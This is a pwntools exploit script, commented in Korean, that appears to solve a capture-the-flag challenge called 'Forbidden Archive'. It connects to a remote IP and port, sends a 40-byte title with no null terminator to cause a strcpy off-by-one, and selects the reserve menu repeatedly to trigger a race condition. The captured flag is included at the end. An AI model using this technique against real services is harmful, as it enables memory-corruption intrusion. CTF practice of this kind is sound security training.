# Stage 4 : Forbidden Archive
#
# 1. 이름과 책 제목 입력
#       → book 에 40 바이트(널 없이) 입력
#       → 스택의 NULL 까지 이어지는 “길이를 모르는” 문자열
# 2. 메뉴 2(Reserve)를 초당 여러 번 연속 선택해 race condition 발동
#       → user7 이 여러 번 큐에 삽입되면서 40+1 바이트 strcpy →
#       → 다음 user 엔트리 id LSB 를 0x00 으로 패칭
# 3. 메뉴 4(Borrow) 호출 → flag.txt 읽기

from pwn import *

p = remote('128.134.83.160', 41404)  # 원격 서버

# menu에서 choice 변수 전송 전용 함수
def choice(n: int):
    p.sendlineafter(b'Choice:', str(n).encode())

# 1) 프롤로그 · 큐 출력까지 스킵
p.recvuntil(b'===== Current Waiting Users =====')
p.recvuntil(b'===================================')  # 큐 덤프 끝

# 2) 회원가입 – 이름 / 책 제목 입력
#
#   책 제목은 정확히 40 바이트(널 없음)
#   → 이후 strcpy 시 41-byte 복사(off-by-one) 유발
#
p.sendafter(b'User name:', b'potato\n')
book = b'A' * 39 + b'\x65' # NULL 없이 40바이트
p.sendafter(b'Book title to borrow:', book + b'\n')

for _ in range(6):                   # 6~7회 정도면 충분 (큐 끝까지)
    choice(2)                       # Reserve a book

p.interactive()

# FLAG{th3_f1r57_r34d3r_g375_7h3_f14g}
